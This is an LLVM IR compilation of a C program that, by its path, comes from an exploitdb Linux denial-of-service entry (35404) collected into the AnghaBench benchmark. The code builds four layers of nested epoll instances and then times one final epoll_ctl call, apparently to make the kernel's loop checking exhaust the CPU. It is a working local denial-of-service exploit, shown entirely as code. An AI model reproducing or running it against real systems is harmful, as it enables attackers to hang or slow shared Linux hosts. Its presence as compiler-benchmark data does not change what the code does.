; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_35404.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_35404.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i64 }
%struct.epoll_event = type { i32 }

@SIZE = common dso_local global i32 0, align 4
@EPOLLIN = common dso_local global i32 0, align 4
@EPOLL_CTL_ADD = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"error 1\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"error 2\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"error 3\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"error 4\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"error 5\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"%ld\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.timeval, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca %struct.epoll_event, align 4
  store i32 0, i32* %1, align 4
  %15 = load i32, i32* @SIZE, align 4
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %2, align 8
  %18 = alloca i32, i64 %16, align 16
  store i64 %16, i64* %3, align 8
  %19 = load i32, i32* @SIZE, align 4
  %20 = zext i32 %19 to i64
  %21 = alloca i32, i64 %20, align 16
  store i64 %20, i64* %4, align 8
  %22 = load i32, i32* @SIZE, align 4
  %23 = zext i32 %22 to i64
  %24 = alloca i32, i64 %23, align 16
  store i64 %23, i64* %5, align 8
  %25 = load i32, i32* @SIZE, align 4
  %26 = zext i32 %25 to i64
  %27 = alloca i32, i64 %26, align 16
  store i64 %26, i64* %6, align 8
  %28 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %14, i32 0, i32 0
  %29 = load i32, i32* @EPOLLIN, align 4
  store i32 %29, i32* %28, align 4
  %30 = call i32 @epoll_create(i32 1)
  store i32 %30, i32* %10, align 4
  store i32 0, i32* %7, align 4
  br label %31

31:                                               ; preds = %52, %0
  %32 = load i32, i32* %7, align 4
  %33 = load i32, i32* @SIZE, align 4
  %34 = icmp slt i32 %32, %33
  br i1 %34, label %35, label %55

35:                                               ; preds = %31
  %36 = call i32 @epoll_create(i32 1)
  %37 = load i32, i32* %7, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i32, i32* %18, i64 %38
  store i32 %36, i32* %39, align 4
  %40 = load i32, i32* %10, align 4
  %41 = load i32, i32* @EPOLL_CTL_ADD, align 4
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i32, i32* %18, i64 %43
  %45 = load i32, i32* %44, align 4
  %46 = call i32 @epoll_ctl(i32 %40, i32 %41, i32 %45, %struct.epoll_event* %14)
  store i32 %46, i32* %9, align 4
  %47 = load i32, i32* %9, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %49, label %51

49:                                               ; preds = %35
  %50 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  br label %51

51:                                               ; preds = %49, %35
  br label %52

52:                                               ; preds = %51
  %53 = load i32, i32* %7, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %7, align 4
  br label %31

55:                                               ; preds = %31
  store i32 0, i32* %7, align 4
  br label %56

56:                                               ; preds = %89, %55
  %57 = load i32, i32* %7, align 4
  %58 = load i32, i32* @SIZE, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %92

60:                                               ; preds = %56
  %61 = call i32 @epoll_create(i32 1)
  %62 = load i32, i32* %7, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i32, i32* %21, i64 %63
  store i32 %61, i32* %64, align 4
  store i32 0, i32* %8, align 4
  br label %65

65:                                               ; preds = %85, %60
  %66 = load i32, i32* %8, align 4
  %67 = load i32, i32* @SIZE, align 4
  %68 = icmp slt i32 %66, %67
  br i1 %68, label %69, label %88

69:                                               ; preds = %65
  %70 = load i32, i32* %8, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i32, i32* %18, i64 %71
  %73 = load i32, i32* %72, align 4
  %74 = load i32, i32* @EPOLL_CTL_ADD, align 4
  %75 = load i32, i32* %7, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i32, i32* %21, i64 %76
  %78 = load i32, i32* %77, align 4
  %79 = call i32 @epoll_ctl(i32 %73, i32 %74, i32 %78, %struct.epoll_event* %14)
  %80 = load i32, i32* %9, align 4
  %81 = icmp ne i32 %80, 0
  br i1 %81, label %82, label %84

82:                                               ; preds = %69
  %83 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  br label %84

84:                                               ; preds = %82, %69
  br label %85

85:                                               ; preds = %84
  %86 = load i32, i32* %8, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %8, align 4
  br label %65

88:                                               ; preds = %65
  br label %89

89:                                               ; preds = %88
  %90 = load i32, i32* %7, align 4
  %91 = add nsw i32 %90, 1
  store i32 %91, i32* %7, align 4
  br label %56

92:                                               ; preds = %56
  store i32 0, i32* %7, align 4
  br label %93

93:                                               ; preds = %126, %92
  %94 = load i32, i32* %7, align 4
  %95 = load i32, i32* @SIZE, align 4
  %96 = icmp slt i32 %94, %95
  br i1 %96, label %97, label %129

97:                                               ; preds = %93
  %98 = call i32 @epoll_create(i32 1)
  %99 = load i32, i32* %7, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i32, i32* %24, i64 %100
  store i32 %98, i32* %101, align 4
  store i32 0, i32* %8, align 4
  br label %102

102:                                              ; preds = %122, %97
  %103 = load i32, i32* %8, align 4
  %104 = load i32, i32* @SIZE, align 4
  %105 = icmp slt i32 %103, %104
  br i1 %105, label %106, label %125

106:                                              ; preds = %102
  %107 = load i32, i32* %8, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i32, i32* %21, i64 %108
  %110 = load i32, i32* %109, align 4
  %111 = load i32, i32* @EPOLL_CTL_ADD, align 4
  %112 = load i32, i32* %7, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i32, i32* %24, i64 %113
  %115 = load i32, i32* %114, align 4
  %116 = call i32 @epoll_ctl(i32 %110, i32 %111, i32 %115, %struct.epoll_event* %14)
  %117 = load i32, i32* %9, align 4
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %119, label %121

119:                                              ; preds = %106
  %120 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0))
  br label %121

121:                                              ; preds = %119, %106
  br label %122

122:                                              ; preds = %121
  %123 = load i32, i32* %8, align 4
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %8, align 4
  br label %102

125:                                              ; preds = %102
  br label %126

126:                                              ; preds = %125
  %127 = load i32, i32* %7, align 4
  %128 = add nsw i32 %127, 1
  store i32 %128, i32* %7, align 4
  br label %93

129:                                              ; preds = %93
  store i32 0, i32* %7, align 4
  br label %130

130:                                              ; preds = %163, %129
  %131 = load i32, i32* %7, align 4
  %132 = load i32, i32* @SIZE, align 4
  %133 = icmp slt i32 %131, %132
  br i1 %133, label %134, label %166

134:                                              ; preds = %130
  %135 = call i32 @epoll_create(i32 1)
  %136 = load i32, i32* %7, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i32, i32* %27, i64 %137
  store i32 %135, i32* %138, align 4
  store i32 0, i32* %8, align 4
  br label %139

139:                                              ; preds = %159, %134
  %140 = load i32, i32* %8, align 4
  %141 = load i32, i32* @SIZE, align 4
  %142 = icmp slt i32 %140, %141
  br i1 %142, label %143, label %162

143:                                              ; preds = %139
  %144 = load i32, i32* %8, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i32, i32* %24, i64 %145
  %147 = load i32, i32* %146, align 4
  %148 = load i32, i32* @EPOLL_CTL_ADD, align 4
  %149 = load i32, i32* %7, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds i32, i32* %27, i64 %150
  %152 = load i32, i32* %151, align 4
  %153 = call i32 @epoll_ctl(i32 %147, i32 %148, i32 %152, %struct.epoll_event* %14)
  %154 = load i32, i32* %9, align 4
  %155 = icmp ne i32 %154, 0
  br i1 %155, label %156, label %158

156:                                              ; preds = %143
  %157 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  br label %158

158:                                              ; preds = %156, %143
  br label %159

159:                                              ; preds = %158
  %160 = load i32, i32* %8, align 4
  %161 = add nsw i32 %160, 1
  store i32 %161, i32* %8, align 4
  br label %139

162:                                              ; preds = %139
  br label %163

163:                                              ; preds = %162
  %164 = load i32, i32* %7, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %7, align 4
  br label %130

166:                                              ; preds = %130
  %167 = call i32 @epoll_create(i32 1)
  store i32 %167, i32* %11, align 4
  %168 = call i32 @gettimeofday(%struct.timeval* %12, i32* null)
  %169 = load i32, i32* %11, align 4
  %170 = load i32, i32* @EPOLL_CTL_ADD, align 4
  %171 = load i32, i32* %10, align 4
  %172 = call i32 @epoll_ctl(i32 %169, i32 %170, i32 %171, %struct.epoll_event* %14)
  store i32 %172, i32* %9, align 4
  %173 = load i32, i32* %9, align 4
  %174 = icmp ne i32 %173, 0
  br i1 %174, label %175, label %177

175:                                              ; preds = %166
  %176 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  br label %177

177:                                              ; preds = %175, %166
  %178 = call i32 @gettimeofday(%struct.timeval* %13, i32* null)
  %179 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  %180 = load i32, i32* %179, align 8
  %181 = mul nsw i32 %180, 1000000
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  %184 = load i64, i64* %183, align 8
  %185 = add nsw i64 %182, %184
  %186 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  %187 = load i32, i32* %186, align 8
  %188 = mul nsw i32 %187, 1000000
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  %191 = load i64, i64* %190, align 8
  %192 = add nsw i64 %189, %191
  %193 = sub nsw i64 %185, %192
  %194 = call i32 @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i64 %193)
  store i32 0, i32* %1, align 4
  %195 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %195)
  %196 = load i32, i32* %1, align 4
  ret i32 %196
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @epoll_create(i32) #2

declare dso_local i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @gettimeofday(%struct.timeval*, i32*) #2

declare dso_local i32 @printf(i8*, i64) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
